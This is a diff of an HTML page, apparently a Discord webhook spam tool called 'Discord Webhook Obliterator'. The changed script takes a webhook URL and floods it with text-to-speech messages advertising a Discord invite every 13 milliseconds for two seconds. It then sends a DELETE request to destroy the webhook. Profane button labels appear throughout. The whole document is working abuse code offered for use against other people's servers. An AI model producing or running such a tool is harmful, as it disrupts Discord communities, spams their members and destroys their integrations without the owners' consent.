@@ -1,77 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Webhook Fucker</title>
-<style>
-body {
-  font-family: sans-serif;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  height: 100vh;
-  margin: 0;
-}
-
-input[type="text"] {
-  padding: 10px;
-  margin: 10px;
-  width: 300px;
-}
-
-button {
-  padding: 10px 20px;
-  background-color: #7289da;
-  color: white;
-  border: none;
-  cursor: pointer;
-}
-</style>
+  <title>DWOM </title>
 </head>
 <body>
-  <h1>Discord Webhook TTS Spam</h1>
-  <input type="text" id="webhookUrl" placeholder="Enter Discord Webhook URL">
-  <button onclick="sendWebhook()">Send Message</button>
+  <h1>(Discord Webhook Obliterator, Mobile Compatible)</h1>
+  <label for="webhookUrl">Discord Webhook URL:</label>
+  <input type="text" id="webhookUrl" name="webhookUrl"><br><br>
+  <button onclick="spamWebhook()">FUCK IT NOEWWAE!!!1!111!!</button>
 
   <script>
-    async function sendWebhook() {
-      const webhookUrl = document.getElementById("webhookUrl").value;
-      const message = {
-        content: "GO TO https://discord.gg/DDzqecnvRM AND NEVER BE RACIST",
-        tts: true,
-      };
+    async function spamWebhook() {
+      const webhookUrl = document.getElementById('webhookUrl').value;
+      const message = "GO TO https://discord.gg/DDzqecnvRM AND NEVER BE RACIST, NEVER SCAM THE RAS TEAM";
 
       if (!webhookUrl) {
         alert("Please enter a webhook URL.");
         return;
       }
 
-      const startTime = performance.now();
-      let count = 0;
-
-      while(performance.now() - startTime < 13) {
-
-        try{
+      async function sendMessage() {
+        try {
           const response = await fetch(webhookUrl, {
-            method: "POST",
+            method: 'POST',
             headers: {
-              "Content-Type": "application/json",
+              'Content-Type': 'application/json',
             },
-            body: JSON.stringify(message),
+            body: JSON.stringify({
+              content: message,
+              tts: true,
+            }),
           });
 
           if (!response.ok) {
-            console.error(`Webhook failed. Status: ${response.status}`);
-            return;
+            console.error(`Failed to send message: ${response.status} ${response.statusText}`);
           }
         } catch (error) {
-          console.error("Error sending webhook:", error);
-          return;
+          console.error("Error sending message:", error);
         }
-
-        count++;
       }
-      console.log(`Sent ${count} messages in under 13 milliseconds.`);
+
+      async function deleteWebhook() {
+          try {
+              const response = await fetch(webhookUrl, {
+                  method: 'DELETE',
+              });
+              if (!response.ok) {
+                  console.error(`Failed to delete webhook: ${response.status} ${response.statusText}`);
+              } else {
+                console.log("webhook deleted")
+              }
+          } catch(error) {
+              console.error("Error deleting webhook:", error);
+          }
+      }
+
+      const interval = 13; // milliseconds
+      let spamInterval = setInterval(sendMessage, interval);
+
+      setTimeout(async () => {
+        clearInterval(spamInterval);
+        await deleteWebhook();
+
+      }, 2000); // 2 seconds
     }
   </script>
 </body>
